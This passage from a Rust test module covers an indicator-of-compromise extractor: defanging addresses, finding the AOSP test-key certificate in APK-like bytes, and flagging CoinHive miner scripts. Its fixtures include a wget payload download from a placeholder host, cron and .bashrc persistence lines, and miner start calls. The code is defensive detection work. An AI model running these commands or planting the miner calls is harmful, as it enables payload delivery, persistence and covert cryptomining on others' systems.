            .map(|i| i.value.as_str())
            .collect();
        assert!(hosts.is_empty(), "{hosts:?}");
    }

    #[test]
    fn defang_brackets_addresses_hosts_urls_and_emails() {
        for (input, expected) in [
            ("192.0.2.44", "192[.]0[.]2[.]44"),
            ("192.0.2.44:6667", "192[.]0[.]2[.]44:6667"),
            ("2001:db8::7", "2001[:]db8[:][:]7"),
            ("[2001:db8::7]:22", "[2001[:]db8[:][:]7]:22"),
            (
                "http://198.51.100.7:8080/bins/x86?a=1",
                "hxxp://198[.]51[.]100[.]7:8080/bins/x86?a=1",
            ),
            (
                "https://evil.example.net/i",
                "hxxps://evil[.]example[.]net/i",
            ),
            ("tftp://198.51.100.7/x86", "tfxp://198[.]51[.]100[.]7/x86"),
            ("ftp://[2001:db8::2]/f", "fxp://[2001[:]db8[:][:]2]/f"),
            (
                "http://<redacted>@203.0.113.1/x",
                "hxxp://<redacted>[@]203[.]0[.]113[.]1/x",
            ),
            (
                "gw.proxyfixture.example:8000",
                "gw[.]proxyfixture[.]example:8000",
            ),
            ("irc.example.org", "irc[.]example[.]org"),
            ("ops@mail.example.com", "ops[@]mail[.]example[.]com"),
            (
                "127.0.0.1 rival.example.net",
                "127[.]0[.]0[.]1 rival[.]example[.]net",
            ),
        ] {
            assert_eq!(defang(input), expected, "{input}");
        }
        // Commands, paths, unit and file names, keys and markers stay readable.
        for unchanged in [
            "@reboot /var/tmp/w.sh",
            "ExecStart=/home/developer/.config/netai -c conf",
            "unit watcher-netai.service",
            "echo '/var/tmp/%s &' >> /root/.bashrc",
            "SHA256:pJJ5O45oiDv8biQy+j5TSe6JfzJ0daZcA7SkbNOEApA",
            "sha512-crypt sha256:0123456789abcdef",
            "#fixturechan",
            "CONNECT %s:%d HTTP/1.1",
        ] {
            assert_eq!(defang(unchanged), unchanged);
        }
        // A word inside a command is defanged where it stands.
        assert_eq!(
            defang("cd /tmp; wget http://198.51.100.7/i -O i"),
            "cd /tmp; wget hxxp://198[.]51[.]100[.]7/i -O i"
        );
    }

    /// The public AOSP test key certificate, `build/target/product/security/testkey.x509.pem`
    /// (Apache-2.0), base64 of its DER. It is the one input that cannot be synthesized: the
    /// fingerprint to find is this certificate's. The sample the indicator came from is not here.
    const AOSP_TESTKEY_B64: &str = "MIIEqDCCA5CgAwIBAgIJAJNurL4H8gHfMA0GCSqGSIb3DQEBBQUAMIGUMQswCQYD\
        VQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4g\
        VmlldzEQMA4GA1UEChMHQW5kcm9pZDEQMA4GA1UECxMHQW5kcm9pZDEQMA4GA1UE\
        AxMHQW5kcm9pZDEiMCAGCSqGSIb3DQEJARYTYW5kcm9pZEBhbmRyb2lkLmNvbTAe\
        Fw0wODAyMjkwMTMzNDZaFw0zNTA3MTcwMTMzNDZaMIGUMQswCQYDVQQGEwJVUzET\
        MBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzEQMA4G\
        A1UEChMHQW5kcm9pZDEQMA4GA1UECxMHQW5kcm9pZDEQMA4GA1UEAxMHQW5kcm9p\
        ZDEiMCAGCSqGSIb3DQEJARYTYW5kcm9pZEBhbmRyb2lkLmNvbTCCASAwDQYJKoZI\
        hvcNAQEBBQADggENADCCAQgCggEBANaTGQTexgskse3HYuDZ2CU+Ps1s6x3i/waM\
        qOi8qM1r03hupwqnbOYOuw+ZNVn/2T53qUPn6D1LZLjk/qLT5lbx4meoG7+yMLV4\
        wgRDvkxyGLhG9SEVhvA4oU6Jwr44f46+z4/Kw9oe4zDJ6pPQp8PcSvNQIg1QCAcy\
        4ICXF+5qBTNZ5qaU7Cyz8oSgpGbIepTYOzEJOmc3Li9kEsBubULxWBjf/gOBzAzU\
        RNps3cO4JFgZSAGzJWQTT7/emMkod0jb9WdqVA2BVMi7yge54kdVMxHEa5r3b97s\
        zI5p58ii0I54JiCUP5lyfTwE/nKZHZnfm644oLIXf6MdW2r+6R8CAQOjgfwwgfkw\
        HQYDVR0OBBYEFEhZAFY9JyxGrhGGBaR0GawJyowRMIHJBgNVHSMEgcEwgb6AFEhZ\
        AFY9JyxGrhGGBaR0GawJyowRoYGapIGXMIGUMQswCQYDVQQGEwJVUzETMBEGA1UE\
        CBMKQ2FsaWZvcm5pYTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzEQMA4GA1UEChMH\
        QW5kcm9pZDEQMA4GA1UECxMHQW5kcm9pZDEQMA4GA1UEAxMHQW5kcm9pZDEiMCAG\
        CSqGSIb3DQEJARYTYW5kcm9pZEBhbmRyb2lkLmNvbYIJAJNurL4H8gHfMAwGA1Ud\
        EwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAHqvlozrUMRBBVEY0NqrrwFbinZa\
        J6cVosK0TyIUFf/azgMJWr+kLfcHCHJsIGnlw27drgQAvilFLAhLwn62oX6snb4Y\
        LCBOsVMR9FXYJLZW2+TcIkCRLXWG/oiVHQGo/rWuWkJgU134NDEFJCJGjDbiLCpe\
        +ZTWHdcwauTJ9pUbo8EvHRkU3cYfGmLaLfgn9gP+pWA7LFQNvXwBnDa6sppCccEX\
        31I828XzgXpJ4O+mDL1/dBd+ek8ZPUP0IgdyZm5MTYPhvVqGCHzzTy3sIeJFymwr\
        sBbmg2OAUNLEMO6nwmocSdN2ClirfxqCzJOLSDE4QyS9BAH6EhY6UFcOaE0=";
    const AOSP_FINGERPRINT: &str = "certificate SHA256:A4:0D:A8:0A:59:D1:70:CA:A9:50:CF:15:C1:8C:45:4D:47:A3:9B:26:98:9D:8B:64:0E:CD:74:5B:A7:1B:F5:DC";

    fn aosp_der() -> Vec<u8> {
        STANDARD.decode(AOSP_TESTKEY_B64).unwrap()
    }

    /// A zip-shaped body with `cert` embedded the way an APK Signing Block carries a certificate:
    /// uncompressed, between other bytes.
    fn apk_like(cert: &[u8]) -> Vec<u8> {
        let mut apk = b"PK\x03\x04".to_vec();
        apk.extend((0..300u16).map(|i| (i % 251) as u8 | 0x80));
        apk.extend_from_slice(cert);
        apk.extend((0..77u16).map(|i| (i % 13) as u8 | 0x80));
        apk
    }

    #[test]
    fn an_apk_carrying_the_aosp_test_key_certificate_is_flagged() {
        let der = aosp_der();
        assert_eq!(der.len(), 1196);
        let (read, found) = extract_from_artifact(&apk_like(&der)).expect("scanned");
        assert_eq!(read, ArtifactRead::Strings);
        assert_eq!(
            of(IocKind::RsaKey, &found),
            vec![AOSP_FINGERPRINT.to_string()]
        );
        let hit = found.iter().find(|i| i.kind == IocKind::RsaKey).unwrap();
        assert!(hit.detail.contains("AOSP test key"), "{}", hit.detail);
    }

    #[test]
    fn a_look_alike_certificate_or_a_cut_one_is_not_the_test_key() {
        let der = aosp_der();
        let mut altered = der.clone();
        altered[600] ^= 1;
        let cut = &der[..der.len() - 1];
        for body in [apk_like(&altered), apk_like(cut)] {
            let (_, found) = extract_from_artifact(&body).expect("scanned");
            assert!(of(IocKind::RsaKey, &found).is_empty(), "{found:?}");
        }
        // The bytes run out inside the certificate the header promises.
        let mut truncated = b"PK\x03\x04".to_vec();
        truncated.extend_from_slice(&der[..500]);
        assert!(known_signing_certs(&truncated, &KNOWN_SIGNING_CERTS).is_empty());
    }

    #[test]
    fn only_a_zip_is_searched_for_signing_certificates() {
        let der = aosp_der();
        let mut not_a_zip = apk_like(&der);
        not_a_zip[0] = b'X';
        let (_, found) = extract_from_artifact(&not_a_zip).expect("scanned");
        assert!(of(IocKind::RsaKey, &found).is_empty(), "{found:?}");
        // A name the table does not know yields nothing, even as a marker line.
        let found = extract(&format!("{SIGNING_CERT_MARKER}somebody-elses-key"), 8);
        assert!(found.is_empty(), "{found:?}");
    }

    #[test]
    fn a_synthetic_certificate_is_found_wherever_it_sits_and_counted_once() {
        let key = rcgen::KeyPair::generate().unwrap();
        let der = rcgen::CertificateParams::new(vec!["apk-fixture.example".to_string()])
            .unwrap()
            .self_signed(&key)
            .unwrap()
            .der()
            .to_vec();
        assert_eq!(
            &der[..2],
            &[0x30, 0x82],
            "fixture must use a two-byte DER length"
        );
        let known = [KnownCert {
            der_len: der.len(),
            sha256: Sha256::digest(&der).as_slice().try_into().unwrap(),
            name: "synthetic",
            detail: "synthetic fixture",
        }];
        let mut body = apk_like(&der);
        body.extend_from_slice(&der);
        assert_eq!(known_signing_certs(&body, &known), vec!["synthetic"]);
        assert!(known_signing_certs(&apk_like(&aosp_der()), &known).is_empty());
    }

    #[test]
    fn look_alike_headers_cost_a_bounded_number_of_hashes() {
        let der = aosp_der();
        // A header with the right length, many times over, then the real certificate: the scan
        // gives up after MAX_CERT_CANDIDATES rather than hashing each one.
        let mut decoy = vec![0x30, 0x82, 0x04, 0xA8];
        decoy.resize(1196, 0);
        let mut body = b"PK\x03\x04".to_vec();
        for _ in 0..=MAX_CERT_CANDIDATES {
            body.extend_from_slice(&decoy);
        }
        body.extend_from_slice(&der);
        assert!(known_signing_certs(&body, &KNOWN_SIGNING_CERTS).is_empty());
        // Within the bound the certificate is still found.
        let mut body = b"PK\x03\x04".to_vec();
        for _ in 0..MAX_CERT_CANDIDATES - 1 {
            body.extend_from_slice(&decoy);
        }
        body.extend_from_slice(&der);
        assert_eq!(
            known_signing_certs(&body, &KNOWN_SIGNING_CERTS),
            vec!["aosp-testkey"]
        );
    }

    #[test]
    fn coinhive_script_urls_are_miner_indicators_on_the_three_known_hosts() {
        let page = "<script src=\"https://coinhive.com/lib/coinhive.min.js\"></script>\n\
                    <script src=\"//authedmine.com/lib/authedmine.min.js\"></script>\n\
                    <script src='http://coin-hive.com/lib/coinhive.min.js'></script>\n\
                    <script src=\"https://CDN.CoinHive.com/lib/coinhive.min.js\"></script>";
        let found = extract_artifact_text(page);
        let miners: Vec<&Indicator> = found
            .iter()
            .filter(|i| i.kind == IocKind::Url && i.detail == "CoinHive miner script")
            .collect();
        let values: Vec<&str> = miners.iter().map(|i| i.value.as_str()).collect();
        assert_eq!(
            values,
            vec![
                "https://coinhive.com/lib/coinhive.min.js",
                "https://CDN.CoinHive.com/lib/coinhive.min.js",
                "http://coin-hive.com/lib/coinhive.min.js",
                "//authedmine.com/lib/authedmine.min.js",
            ]
        );
        // The same URL is not recorded a second time with only its host as detail.
        let urls = of(IocKind::Url, &found);
        assert_eq!(
            urls.iter()
                .filter(|u| u.ends_with("coinhive.min.js") && u.contains("//coinhive.com"))
                .count(),
            1,
            "{urls:?}"
        );
    }

    #[test]
    fn a_similar_host_or_a_non_script_is_not_a_miner_script() {
        for text in [
            "https://evilcoinhive.com/lib/coinhive.min.js",
            "https://coinhive.com.example.net/lib/coinhive.min.js",
            "https://not-coinhive.com/lib/coinhive.min.js",
            "https://coinhive.com/lib/cryptonight.wasm",
            "https://coinhive.com/about",
            "see coinhive.com for details",
        ] {
            let found = extract_artifact_text(text);
            assert!(
                found.iter().all(|i| i.detail != "CoinHive miner script"),
                "{text}: {found:?}"
            );
        }
    }

    #[test]
    fn a_configured_miner_is_flagged_without_its_site_key() {
        const KEY: &str = "SYNTHETICSITEKEY0123456789abcdef";
        for call in [
            format!("var miner = new CoinHive.Anonymous('{KEY}'); miner.start();"),
            format!("new CoinHive.Anonymous(\"{KEY}\", {{throttle: 0.3}})"),
            format!("var m=new CoinHive.User ( '{KEY}', 'someone');"),
        ] {
            let found = extract_artifact_text(&call);
            assert_eq!(
                of(IocKind::Credentials, &found),
                vec!["CoinHive site key".to_string()],
                "{call}"
            );
            let hit = found
                .iter()
                .find(|i| i.kind == IocKind::Credentials)
                .unwrap();
            assert_eq!(hit.detail, CREDENTIALS_DETAIL);
            for i in &found {
                assert!(!i.value.contains(KEY) && !i.detail.contains(KEY), "{i:?}");
            }
        }
        for text in [
            "CoinHive.Anonymous is a class",
            "console.log('CoinHive.Anonymous')",
            "var CoinHiveAnonymous = 1;",
        ] {
            let found = extract_artifact_text(text);
            assert!(
                of(IocKind::Credentials, &found).is_empty(),
                "{text}: {found:?}"
            );
        }
    }

    #[test]
    fn miner_indicators_are_found_in_a_binarys_strings() {
        let mut blob = vec![0u8, 1, 2, 3];
        blob.extend_from_slice(b"\x00\x00https://coinhive.com/lib/coinhive.min.js\x00\x01");
        blob.extend_from_slice(
            b"\x00new CoinHive.Anonymous('SYNTHETICSITEKEY0123456789abcdef')\x00",
        );
        let (read, found) = extract_from_artifact(&blob).expect("scanned");
        assert_eq!(read, ArtifactRead::Strings);
        assert_eq!(
            of(IocKind::Credentials, &found),
            vec!["CoinHive site key".to_string()]
        );
        assert!(
            found
                .iter()
                .any(|i| i.kind == IocKind::Url && i.detail == "CoinHive miner script"),
            "{found:?}"
        );
    }

    #[test]
    fn every_kind_round_trips_through_its_stored_name() {
        for kind in IocKind::ALL {
            assert_eq!(IocKind::parse(kind.as_str()), Some(kind));
        }
        assert_eq!(IocKind::parse("credential"), None);
    }
}
